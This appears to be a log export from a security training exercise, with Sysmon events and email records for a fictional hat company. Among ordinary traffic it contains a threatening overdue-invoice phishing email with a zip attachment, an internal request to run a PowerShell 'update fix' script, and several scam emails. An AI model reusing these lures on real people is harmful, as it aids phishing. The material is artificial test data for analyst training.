"W3VjypsB8mE-0EyZ636Z","-",logs,"-","-","-",sysmon,"-","172.16.1.15","mailsrv-01.tryhatme.com","172.16.1.15","Dns query (rule: DnsQuery)",22,"-","win-3456","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3914,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:17:42.304","-"
"XHVjypsB8mE-0EyZ9379","-",logs,"-","ImportantInvoice-Febrary.zip","URGENT: Your account is 30 days past due and will be suspended today unless immediate payment is processed. Legal action will commence if payment is not received within 24 hours. Open the attached invoice immediately to view payment options and avoid legal consequences.",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michael.ascot@tryhatme.com","-","-","-","john@hatmakereurope.xyz","FINAL NOTICE: Overdue Payment - Account Suspension Imminent","Jan 17, 2026 @ 02:17:41.304","-"
"V3VjypsB8mE-0EyZin4I","-",logs,"-",None," I have some ideas on branding and material choices Looking forward to refining the concept together",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","lance@trendytopperssummit.com","-","-","-","roger.fedora@tryhatme.com","RE: RE: Collaboration Opportunity: Joint Hat Collection Proposal","Jan 17, 2026 @ 02:17:38.304","-"
"WXVjypsB8mE-0EyZln4c","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3455","-","-","-","-","-","-","spoolsv.exe","-","-",3957,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{9A7D6000-6360-4067-AFEC-3F8722701AC5}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{9A7D6000-6360-4067-AFEC-3F8722701AC5}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:17:32.304","-"
"WnVjypsB8mE-0EyZmX7O","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3450","-","-","-","-","-","-","-","-","-",3939,"-","-","System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0004\DriverVersion","HKLM\System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0004\DriverVersion",DriverVersion,"-","-","Jan 17, 2026 @ 02:17:29.304","-"
"WHVjypsB8mE-0EyZin5F","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3449","-","-","-","-","-","-","spoolsv.exe","-","-",3658,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{9A7D6000-6360-4067-AFEC-3F8722701AC5}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{9A7D6000-6360-4067-AFEC-3F8722701AC5}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:17:22.304","-"
"VXVjypsB8mE-0EyZDH7p","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3456","-","-","-","-","-","-","-","-","-",3915,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{49455221-FA52-47F9-826D-B41CFD35E447}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{49455221-FA52-47F9-826D-B41CFD35E447}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:17:09.304","-"
"VnVjypsB8mE-0EyZZ351","-",logs,"-",None," Is your email inbox too small We have the solution Expand your storage for free just enter your password and enjoy unlimited space",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","williamson@styleiconsinfluencers.net","-","-","-","ashwin.johnston@tryhatme.com","Scam Alert Fake Hat Hotel Vouchers Up for Grabs","Jan 17, 2026 @ 02:17:04.304","-"
"T3ViypsB8mE-0EyZaH7x","-",logs,"-",None," We need better projections for next quarter—let’s discuss.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","invoice@tryhatme.com","-","-","-","invoice@tryhatme.com","RE: RE: Quarterly Sales Report - Action Required","Jan 17, 2026 @ 02:16:44.304","-"
"VHVjypsB8mE-0EyZCX4F","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3461","-","-","-","-","-","-","spoolsv.exe","-","-",3527,"-","-","System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{9A7D6000-6360-4067-AFEC-3F8722701AC5}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName","HKLM\System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{9A7D6000-6360-4067-AFEC-3F8722701AC5}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:16:42.304","-"
"UnViypsB8mE-0EyZr35_","-",logs,"-",None," We will be attending the upcoming trade show and would love to schedule a meeting to discuss potential collaborations and new industry trends",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","contact@tryhatme.com","-","-","-","hannah@customcrownhats.org","Collaboration Opportunity: Joint Hat Collection Proposal","Jan 17, 2026 @ 02:16:36.304","-"
"U3ViypsB8mE-0EyZs34Z","-",logs,"-",None," Sharing this event information for those interested in attending",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","sophie.j@tryhatme.com","-","-","-","mejia@hatexpo2022.com","FWD: Seminar Registration: Hat Industry Innovation Trends","Jan 17, 2026 @ 02:16:31.304","-"
"UXViypsB8mE-0EyZn359","-",logs,"-",None," Wear our scientifically unproven hat and lose weight overnight It works because we said so",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","wanda@chicfashionbloggers.net","-","-","-","michelle.smith@tryhatme.com","Magic Weight Loss Hat Pills Shed Pounds Instantly","Jan 17, 2026 @ 02:16:28.304","-"
"UHViypsB8mE-0EyZcH7F","-",logs,"-",None," Warning Your system has been compromised by the deadly Hat Virus Send 100 to unlock your files now",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","mejia@fashionindustrytrends.xyz","-","-","-","ashwin.johnston@tryhatme.com","Your Computer is Infected Pay 100 to Remove the Hat Virus","Jan 17, 2026 @ 02:16:06.304","-"
"TnViypsB8mE-0EyZEn7N","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3456","-","-","-","-","-","-","spoolsv.exe","-","-",3698,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:16:02.304","-"
"THVhypsB8mE-0EyZhn6I","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3449","-","-","-","-","-","-","spoolsv.exe","-","-",3743,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 4)\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 4)\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:15:39.304","-"
"TXVhypsB8mE-0EyZ736p","-",logs,"-",None," Travel through time and experience the evolution of hats from ancient Egypt to futuristic Mars Only 500 per ticket",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","kyra.flores@tryhatme.com","-","-","-","osman@fashionindustrytrends.xyz","Time Traveling Hat Adventure Explore Ancient Lands for Cheap","Jan 17, 2026 @ 02:15:36.304","-"
"S3VhypsB8mE-0EyZW35Q","-",logs,"-",None," Gorgeous hat wearing models from the Moon are searching for their Earth soulmate Could it be you Click to chat now",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","contact@tryhatme.com","-","-","-","oskar@chicfashionbloggers.net","Lunarian Hat Models Want to Meet You Click for Love","Jan 17, 2026 @ 02:15:36.304","-"
"SHVgypsB8mE-0EyZp36k","-",logs,"-",None," Scientists hate us for discovering this new hat cream formula that erases wrinkles instantly Just apply and watch the years disappear",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","shah@hatventuresworldwide.online","-","-","-","sophie.j@tryhatme.com","Miracle Anti-Aging Hat Cream Look 20 Years Younger","Jan 17, 2026 @ 02:14:46.304","-"
"SnVhypsB8mE-0EyZDX4n","-",logs,"-",None," Confirmed. I’ll take the 2 PM slot.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","sophie.j@tryhatme.com","-","-","-","sophie.j@tryhatme.com","RE: Hiring Update - Interview Schedule","Jan 17, 2026 @ 02:14:40.304","-"
"SXVgypsB8mE-0EyZq35s","-",logs,"-",None," Sharing this proposal internally for consideration Let’s discuss further",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","ceo@tryhatme.com","-","-","-","peck@headwearinfluencerhub.com","FWD: Exploring Partnership Potential: Custom Hat Design Proposal","Jan 17, 2026 @ 02:14:35.304","-"
"R3VfypsB8mE-0EyZ0H7E","-",logs,"-",None," Passing this along in case anyone else is interested in joining",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","marshall@hatemporium.com","-","-","-","miguel.odonnell@tryhatme.com","FWD: Invitation to a Business Networking Luncheon Next Week","Jan 17, 2026 @ 02:13:50.304","-"
"RXVfypsB8mE-0EyZAX7C","-",logs,"-","-","-",sysmon,"-","mail.tryhatme.finance, 34.24g4.197.202","autodiscover.tryhatme.finance","34.244.197.202","Dns query (rule: DnsQuery)",22,"-","win-3458","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3906,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:13:03.304","-"
"RnVfypsB8mE-0EyZT37c","-",logs,"-",None," Unlock the ultimate strategy to skyrocket your hat empire No experience needed Just click and watch the profits roll in",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","yani.zubair@tryhatme.com","-","-","-","leonard@fashionindustrytrends.xyz","Grow Your Hat Business Overnight with this Secret Formula","Jan 17, 2026 @ 02:12:39.304","-"
"PnVeypsB8mE-0EyZgH7l","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3451","-","-","-","-","-","taskhostw.exe KEYROAMING","taskhostw.exe","svchost.exe",3653,3585,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:12:21.304","-"
"QHVeypsB8mE-0EyZkH5a","-",logs,"-",None," Got it. Will prepare the slides.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","support@tryhatme.com","-","-","-","support@tryhatme.com","RE: New Product Launch - All Hands on Deck","Jan 17, 2026 @ 02:12:21.304","-"
"RHVeypsB8mE-0EyZ5n5k","-",logs,"-",None," Passing this along in case anyone else is interested in joining",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","roger.fedora@tryhatme.com","-","-","-","lance@trendyheadwearblog.com","FWD: Invitation to a Business Networking Luncheon Next Week","Jan 17, 2026 @ 02:12:13.304","-"
"Q3VeypsB8mE-0EyZ2n62","-",logs,"-",None," We are happy to assist with your custom order Let us know your quantity preferred materials and design details so we can provide a tailored quote",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","hannah@stylishhatboutique.com","-","-","-","invoice@tryhatme.com","Inquiry: Custom Hat Order for Corporate Gifting","Jan 17, 2026 @ 02:12:11.304","-"
"QXVeypsB8mE-0EyZmH4-","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","C:\Windows\system32\rundll32.exe C:\Windows\system32\inetcpl.cpl,ClearMyTracksByProcess Flags:8388616 WinX:0 WinY:0 IEFrame:0000000000000000","rundll32.exe","iexplore.exe",3806,3979,"C:\Users\michael.ascot\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:12:10.304","-"
"QnVeypsB8mE-0EyZs362","-",logs,"-",None," A wealthy Lunarian prince needs your help to transfer 10 million space credits Invest in his intergalactic hat business and double your fortune",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","gerard@fashionindustrytrends.xyz","-","-","-","safa.prince@tryhatme.com","Lunarian Prince Offering Hat Investment Opportunities","Jan 17, 2026 @ 02:12:08.304","-"
"P3VeypsB8mE-0EyZiH6J","-",logs,"-",None," Become a certified hat designer in just 24 hours No studying required No accreditation needed",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","lucie@trendymillineryco.me","-","-","-","support@tryhatme.com","Get Your Degree Online in Hat Design Not Accredited","Jan 17, 2026 @ 02:11:52.304","-"
"PXVeypsB8mE-0EyZeX4M","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3457","-","-","-","-","-","-","spoolsv.exe","-","-",3855,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 5)\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 5)\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:11:42.304","-"
"O3VdypsB8mE-0EyZ7H5r","-",logs,"-",None," Directly imported from outer space These extraterrestrial hats are stylish and glow in the dark Limited stock act fast",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","tobias@headtoppersinc.xyz","-","-","-","invoice@tryhatme.com","Hats from Outer Space Alien Fashion Invasion Sale","Jan 17, 2026 @ 02:11:34.304","-"
"OnVdypsB8mE-0EyZ1H7w","-",logs,"-",None," Do you have estimated costs for different material options and production timelines",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","ceo@tryhatme.com","-","-","-","maximillian@fashionforwardhatter.com","RE: RE: Exploring Partnership Potential: Custom Hat Design Proposal","Jan 17, 2026 @ 02:11:34.304","-"
"PHVeypsB8mE-0EyZC368","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3460","-","-","-","-","-","C:\Windows\System32\mousocoreworker.exe -Embedding","MoUsoCoreWorker.exe","-",3716,3600,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:11:30.304","-"
"OHVdypsB8mE-0EyZrX7t","-",logs,"-",None," Could you provide more details on durability and production costs for large scale manufacturing",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","contact@tryhatme.com","-","-","-","dominguez@headwearconventionworld.net","RE: RE: Vendor Showcase: Latest Hat Materials and Designs","Jan 17, 2026 @ 02:11:29.304","-"
"N3VdypsB8mE-0EyZhn7k","-",logs,"-","-","-",sysmon,"-","mail.tryhatme.finance, 34.24g4.197.202","autodiscover.tryhatme.finance","34.244.197.202","Dns query (rule: DnsQuery)",22,"-","win-3455","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3600,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:11:14.304","-"
"NnVdypsB8mE-0EyZWH4B","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3453","-","-","-","-","-","atbroker.exe","AtBroker.exe","winlogon.exe",3604,3595,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:11:01.304","-"
"OXVdypsB8mE-0EyZzX5G","-",logs,"-",None," Travel the world to explore the most exotic hat cultures Only available to the first 1000 people who enter their credit card details",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","connolly@yahoo.com","-","-","-","armaan.terry@tryhatme.com","Exotic Hat Destination Package Limited Time Offer Inside","Jan 17, 2026 @ 02:11:01.304","-"
"NHVcypsB8mE-0EyZv36o","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3453","-","-","-","-","-","""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:8580 CREDAT:9474 /prefetch:2","iexplore.exe","iexplore.exe",3933,3690,"C:\Users\kyra.flores\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:10:16.304","-"
"NXVcypsB8mE-0EyZz35j","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3459","-","-","-","-","-","C:\Windows\servicing\TrustedInstaller.exe","TrustedInstaller.exe","services.exe",3506,3577,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:09:57.304","-"
"MnVcypsB8mE-0EyZWn4q","-",logs,"-",None," Here is a summary of our last discussion along with action items for the next steps Let us know if you have any modifications",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","williamson@theheadwearhub.com","-","-","-","michelle.smith@tryhatme.com","Follow-up on Previous Discussion: Next Steps for Engagement","Jan 17, 2026 @ 02:09:47.304","-"
"M3VcypsB8mE-0EyZbX6i","-",logs,"-",None," I am available on Thursday afternoon Let me know if that works for everyone else",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","arthur@trendsettingtrilbies.com","-","-","-","michael.ascot@tryhatme.com","RE: Scheduling a Virtual Meeting to Discuss Market Trends","Jan 17, 2026 @ 02:09:26.304","-"
"MXVcypsB8mE-0EyZM34-","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3461","-","-","-","-","-","-","spoolsv.exe","-","-",3598,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 5),40\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 5),40\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:09:03.304","-"
"LHVcypsB8mE-0EyZL37P","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3455","-","-","-","-","-","-","spoolsv.exe","-","-",3703,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 4)\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 4)\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:08:57.304","-"
"JnVcypsB8mE-0EyZJn6b","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3456","-","-","-","-","-","-","spoolsv.exe","-","-",3650,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 4)\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 4)\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:08:49.304","-"
"JXVcypsB8mE-0EyZJX5V","-",logs,"-","-","-",sysmon,"-","172.16.1.10","DC-01.tryhatme.com","172.16.1.10","Dns query (rule: DnsQuery)",22,"-","win-3449","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3801,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:08:47.304","-"
"LnVcypsB8mE-0EyZMX6F","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3456","-","-","-","-","-","-","-","-","-",3957,"-","-","System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0004\DriverVersion","HKLM\System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0004\DriverVersion",DriverVersion,"-","-","Jan 17, 2026 @ 02:08:19.304","-"
"J3VcypsB8mE-0EyZKX6K","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3455","-","-","-","-","-","C:\Windows\system32\rundll32.exe C:\Windows\system32\inetcpl.cpl,ClearMyTracksByProcess Flags:276824072 WinX:0 WinY:0 IEFrame:0000000000000000","rundll32.exe","iexplore.exe",3596,3692,"C:\Users\ashwin.johnston\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:08:17.304","-"
"KnVcypsB8mE-0EyZLn5W","-",logs,"-",None," Sharing in case anyone missed it.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","invoice@tryhatme.com","-","-","-","invoice@tryhatme.com","FWD: Team Building Event - RSVP by Friday","Jan 17, 2026 @ 02:08:09.304","-"
"KHVcypsB8mE-0EyZLH5H","-",logs,"-",None," Our deal is so good it is suspicious Buy one overpriced hat and get 100 free because that is totally sustainable business",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","bertha@fashionnewsdaily.info","-","-","-","armaan.terry@tryhatme.com","Mega Discount: Buy 1 Hat Get 100 More Scam Alert","Jan 17, 2026 @ 02:07:55.304","-"
"K3VcypsB8mE-0EyZL36g","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3459","-","-","-","-","-","C:\Windows\system32\TSTheme.exe -Embedding","TSTheme.exe","-",3848,3508,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:07:40.304","-"
"LXVcypsB8mE-0EyZMH52","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3449","-","-","-","-","-","-","spoolsv.exe","-","-",3978,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 5),40\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Microsoft Print to PDF (redirected 5),40\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:07:39.304","-"
"IHVcypsB8mE-0EyZGn5H","-",logs,"-",None," We have exciting new materials and innovative designs that we would love to showcase Let us know if you would like samples or a walkthrough",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","cain.omoore@tryhatme.com","-","-","-","gardner@stylewatchjournal.com","Vendor Showcase: Latest Hat Materials and Designs","Jan 17, 2026 @ 02:07:38.304","-"
"IXVcypsB8mE-0EyZIH50","-",logs,"-",None," A long lost billionaire relative has left you their secret hat empire To claim your inheritance send us your banking details immediately",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","support@tryhatme.com","-","-","-","eileen@trendymillineryco.me","Inheritance Alert: Unknown Billionaire Relative Left You Their Hat Fortunes","Jan 17, 2026 @ 02:07:33.304","-"
"MHVcypsB8mE-0EyZMn6w","-",logs,"-",None," Do you have a booth number or schedule for presentations I would like to plan accordingly",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","woody@hatnewsdaily.org","-","-","-","cain.omoore@tryhatme.com","RE: RE: Upcoming Trade Show Attendance: Meet our Hat Experts","Jan 17, 2026 @ 02:07:17.304","-"
"I3VcypsB8mE-0EyZIn6v","-",logs,"-",None," Attached are some design mockups and pricing options Let us know if you have any adjustments or additional requests",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","hannah@headlinehats.com","-","-","-","safa.prince@tryhatme.com","RE: Inquiry: Custom Hat Order for Corporate Gifting","Jan 17, 2026 @ 02:07:13.304","-"
"L3VcypsB8mE-0EyZMX6a","-",logs,"-",None," Our exclusive system guarantees instant Bitcoin doubling Send us just 100 and watch it turn into 200 instantly",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","armaan.terry@tryhatme.com","-","-","-","howe@headwearmarketwatch.org","Instant Wealth Send Bitcoin to Double Your Money","Jan 17, 2026 @ 02:07:02.304","-"
"InVcypsB8mE-0EyZIH6k","-",logs,"-","forceupdate.ps1","Hey Michelle, can you run this PowerShell script to fix the update issue we discussed? It should resolve the problem with the automatic updates not working properly.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michelle.smith@tryhatme.com","-","-","-","yani.zubair@tryhatme.com","Force update fix","Jan 17, 2026 @ 02:07:01.304","-"
